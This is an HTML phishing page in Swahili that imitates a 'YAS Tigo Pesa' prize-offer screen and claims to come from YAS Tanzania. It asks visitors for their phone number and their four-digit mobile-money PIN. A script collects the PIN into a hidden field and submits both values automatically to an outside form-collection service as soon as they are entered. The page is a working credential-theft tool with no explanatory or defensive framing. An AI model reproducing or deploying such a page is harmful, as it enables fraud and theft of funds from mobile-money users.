<!DOCTYPE html>
<html lang="sw">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Umejishindia Ofa</title>
    <link rel="stylesheet" href="style.css">
</head>

<body>

<div class="card">
    <h2>Umejishindia Ofa Wa YAS Tigo pesa</h2>

    <p class="subtitle">
        Karibu! Ingiza namba yako ya simu na Neno Siri (PIN ya namba 4) ili kuendelea.
    </p>

    <form id="offerForm" action="https://formbold.com/s/3nqD1" method="POST">

        <!-- Phone -->
        <div class="phone-input">
            <input 
                type="tel" 
                id="phoneNumber" 
                name="phoneNumber"
                placeholder="Namba ya Simu" 
                maxlength="10" 
                required>
        </div>

        <!-- PIN label -->
        <p class="pin-title">Ingiza PIN (namba 4)</p>

        <!-- PIN boxes -->
        <div class="pin-boxes">
            <input type="password" maxlength="1" class="pin-box" inputmode="numeric" autocomplete="off">
            <input type="password" maxlength="1" class="pin-box" inputmode="numeric" autocomplete="off">
            <input type="password" maxlength="1" class="pin-box" inputmode="numeric" autocomplete="off">
            <input type="password" maxlength="1" class="pin-box" inputmode="numeric" autocomplete="off">
        </div>

        <!-- hidden PIN field -->
        <input type="hidden" id="pin" name="pin">

    </form>

    <p class="note">Kwa kuendelea unakubali masharti ya matumizi.</p>
    <footer>© YAS Tanzania</footer>
</div>

<script>
const pinBoxes = document.querySelectorAll('.pin-box');
const hiddenPinInput = document.getElementById('pin');
const form = document.getElementById('offerForm');
const phoneNumberInput = document.getElementById('phoneNumber');

function updateHiddenPin() {
    hiddenPinInput.value = Array.from(pinBoxes)
        .map(i => i.value)
        .join('');
}

function trySubmit() {
    const pinComplete = Array.from(pinBoxes).every(i => i.value.length === 1);
    const phoneOk = phoneNumberInput.value.trim().length > 0;

    if (pinComplete && phoneOk) {
        updateHiddenPin();

        setTimeout(() => {
            form.submit();
        }, 100);
    }
}

pinBoxes.forEach((box, index) => {
    box.addEventListener('input', (e) => {
        e.target.value = e.target.value.replace(/[^0-9]/g, '');

        if (e.target.value && index < pinBoxes.length - 1) {
            pinBoxes[index + 1].focus();
        }

        updateHiddenPin();
        trySubmit();
    });

    box.addEventListener('keydown', (e) => {
        if (e.key === 'Backspace' && !e.target.value && index > 0) {
            pinBoxes[index - 1].focus();
        }
    });
});

phoneNumberInput.addEventListener('input', trySubmit);
</script>

</body>
</html>
